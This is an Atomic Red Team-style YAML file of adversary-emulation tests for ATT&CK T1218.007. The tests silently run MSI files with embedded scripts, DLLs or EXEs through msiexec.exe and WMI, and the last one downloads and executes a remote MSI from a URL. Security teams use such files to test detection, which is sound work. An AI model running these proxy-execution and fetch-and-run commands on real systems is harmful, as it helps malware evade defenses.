attack_technique: T1218.007
display_name: 'Signed Binary Proxy Execution: Msiexec'
atomic_tests:
- name: Msiexec.exe - Execute Local MSI file with embedded JScript
  description: |
    Executes an MSI containing embedded JScript code using msiexec.exe
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_JScript.msi
    action:
      description: |
        Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.
      type: String
      default: i
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /q /#{action} "#{msi_payload}"
    name: command_prompt
- name: Msiexec.exe - Execute Local MSI file with embedded VBScript
  description: |
    Executes an MSI containing embedded VBScript code using msiexec.exe
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_VBScript.msi
    action:
      description: |
        Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.
      type: String
      default: i
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /q /#{action} "#{msi_payload}"
    name: command_prompt
- name: Msiexec.exe - Execute Local MSI file with an embedded DLL
  description: |
    Executes an MSI containing an embedded DLL using msiexec.exe
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_DLL.msi
    action:
      description: |
        Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.
      type: String
      default: i
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /q /#{action} "#{msi_payload}"
    name: command_prompt
- name: Msiexec.exe - Execute Local MSI file with an embedded EXE
  description: |
    Executes an MSI containing an embedded EXE using msiexec.exe
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_EXE.msi
    action:
      description: |
        Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.
      type: String
      default: i
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /q /#{action} "#{msi_payload}"
    name: command_prompt
- name: WMI Win32_Product Class - Execute Local MSI file with embedded JScript
  description: |
    Executes an MSI containing embedded JScript code using the WMI Win32_Product class
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_JScript.msi
    action:
      description: |
        Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.
      type: String
      default: Install
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
    name: powershell
- name: WMI Win32_Product Class - Execute Local MSI file with embedded VBScript
  description: |
    Executes an MSI containing embedded VBScript code using the WMI Win32_Product class
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_VBScript.msi
    action:
      description: |
        Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.
      type: String
      default: Install
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
    name: powershell
- name: WMI Win32_Product Class - Execute Local MSI file with an embedded DLL
  description: |
    Executes an MSI containing an embedded DLL using the WMI Win32_Product class
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_DLL.msi
    action:
      description: |
        Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.
      type: String
      default: Install
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
    name: powershell
- name: WMI Win32_Product Class - Execute Local MSI file with an embedded EXE
  description: |
    Executes an MSI containing an embedded EXE using the WMI Win32_Product class
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\T1218.007_EXE.msi
    action:
      description: |
        Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.
      type: String
      default: Install
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSI file must exist on disk at specified location (#{msi_payload})
    prereq_command: |
      if (Test-Path #{msi_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
    name: powershell
- name: Msiexec.exe - Execute the DllRegisterServer function of a DLL
  description: |
    Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the "src" folder is only built for 64-bit, so this won't work on a 32-bit OS.
  supported_platforms:
  - windows
  input_arguments:
    dll_payload:
      description: DLL to execute that has an implemented DllRegisterServer function
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\MSIRunner.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The DLL must exist on disk at specified location (#{dll_payload})
    prereq_command: |
      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /y "#{dll_payload}"
    name: command_prompt
- name: Msiexec.exe - Execute the DllUnregisterServer function of a DLL
  description: |
    Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the "src" folder is only built for 64-bit, so this won't work on a 32-bit OS.
  supported_platforms:
  - windows
  input_arguments:
    dll_payload:
      description: DLL to execute that has an implemented DllUnregisterServer function
      type: Path
      default: PathToAtomicsFolder\T1218.007\src\MSIRunner.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The DLL must exist on disk at specified location (#{dll_payload})
    prereq_command: |
      if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
    get_prereq_command: |
      Write-Host "You must provide your own MSI"
  executor:
    command: |
      msiexec.exe /z "#{dll_payload}"
    name: command_prompt
- name: Msiexec.exe - Execute Remote MSI file
  description: |
    Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.
  supported_platforms:
  - windows
  input_arguments:
    msi_payload:
      description: MSI file to execute
      type: String
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/T1218.007_JScript.msi
  executor:
    command: |
      msiexec.exe /q /i "#{msi_payload}"
    name: command_prompt